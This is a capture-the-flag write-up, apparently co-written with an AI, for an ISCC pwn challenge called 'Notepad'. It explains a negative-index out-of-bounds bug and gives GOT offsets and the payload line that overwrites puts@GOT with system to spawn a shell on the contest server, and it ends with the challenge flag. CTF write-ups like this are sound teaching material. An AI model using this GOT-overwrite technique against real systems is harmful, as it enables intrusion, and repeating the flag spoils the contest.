# Notepad — ISCC{} Pwn Writeup

**Author:** Claude + Human  
**Challenge:** Notepad (简易记事本程序)  
**Target:** `39.96.193.120:10005`  
**Solves:** 100 of 2432  
**Binary:** `notepad` — amd64 ELF, PIE, No RELRO, NX, Stack Canary, IBT/SHSTK  
**Libc:** `libc.so.6` (Ubuntu GLIBC 2.31), actual server = `libc6_2.31-0ubuntu9.16_amd64`

---

## 1. Vulnerability Analysis

### 1.1 Negative Index OOB

The `get_note()` function checks `if (idx > 9)` but does **not** check for negative indices:

```c
void *get_note() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    if (idx > 9) {
        puts("Invalid Index!");
        exit(-1);
    }
    return &notes + idx * 48;  // sign-extended via movslq
}
```

Since `notes` is a BSS array at `PIE+0x35a0`, negative indices allow reading/writing memory **before** the array. Each note entry is 48 bytes (16 name + 32 content).

### 1.2 GOT Layout (No RELRO)

With **No RELRO**, the GOT is fully writable. Key GOT entries reachable via negative indices:

| Index | Address | Name Field (16B) | Content Field (32B) |
|-------|---------|-------------------|---------------------|
| -1 | PIE+0x3570 | `_IO_2_1_stdin_` (libc) | ... |
| -2 | PIE+0x3540 | `.data` | ... |
| -3 | PIE+0x3510 | **exit@GOT** | GLOB_DAT entries |
| -4 | PIE+0x34e0 | **printf@GOT** | **read@GOT** |
| -5 | PIE+0x34b0 | before GOT + GOT[0] | GOT[1], GOT[2], **puts@GOT**, `__stack_chk_fail@GOT` |

### 1.3 The Critical Index -5 Content Layout

```
notes[-5] = PIE+0x35a0 + (-5 * 48) = PIE+0x34b0

name[0:8]    = PIE+0x34b0  (unused bytes before .got section)
name[8:16]   = PIE+0x34b8  (GOT[0] — _DYNAMIC)
content[0:8] = PIE+0x34c0  (GOT[1] — link_map)
content[8:16]= PIE+0x34c8  (GOT[2] — _dl_runtime_resolve)
content[16:24]=PIE+0x34d0  (puts@GOT)  ← TARGET FOR OVERWRITE
content[24:32]=PIE+0x34d8  (__stack_chk_fail@GOT)
```

**This offset is crucial**: `puts@GOT` is at content bytes **16-23**, NOT bytes 8-15!

---

## 2. Exploit Strategy

### 2.1 Memory Leak

- **Index -1**: Read `_IO_2_1_stdin_` pointer → compute `libc_base`
- **Index -4**: Read `printf@GOT` (name) and `read@GOT` (content) → determine libc function addresses

### 2.2 Compute system Address

The provided libc has different code offsets than the server. Using `libc.rip` to identify the server libc (`libc6_2.31-0ubuntu9.16_amd64`):

| Function | Server Offset |
|----------|-------------|
| `read` | 0x10e1e0 |
| `system` | 0x52290 |

```
system_addr = read_addr - 0x10e1e0 + 0x52290
```

### 2.3 GOT Overwrite via Index -5

Write to `notes[-5]` to overwrite `puts@GOT` with `system`:

```
content bytes: [GOT[1]=0] [GOT[2]=0] [puts@GOT=system] [__stack_chk_fail=printf]
```

All GOT entries are already resolved (setup calls all PLT functions), so zeroing GOT[0..2] is safe.

### 2.4 Trigger via view_note

`view_note` function:
```c
int view_note() {
    s = get_note();           // returns pointer to note 0
    printf("Name: ");         // uses printf@GOT (preserved)
    puts(s);                  // → [puts@GOT = system] → system("/bin/sh")
    printf("Content: ");
    return puts(s + 16);      // → system("AAAA...") — harmless
}
```

When `puts(s)` is called, it jumps to `system("/bin/sh")`, granting a shell.

### 2.5 Server Filter

The server only allows commands `sh` and `/bin/sh` (likely a wrapper that validates arguments to `system()`). So the note name must be `/bin/sh\x00`.

---

## 3. Exploit Script

See [exploit_final.py](./exploit_final.py).

Key steps:
1. Leak libc base via index -1
2. Leak printf/read via index -4
3. Compute system address
4. Create note 0 with `/bin/sh\x00`
5. Overwrite puts@GOT with system via index -5
6. View note 0 → shell

**Critical payload line** (the fix that made it work):
```python
p.send(p64(0) + p64(0) + p64(system_addr) + p64(printf_addr))
#     GOT[1]=0  GOT[2]=0  puts@GOT=system   __stack_chk_fail=printf
```

---

## 4. Flag

```
ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}
```
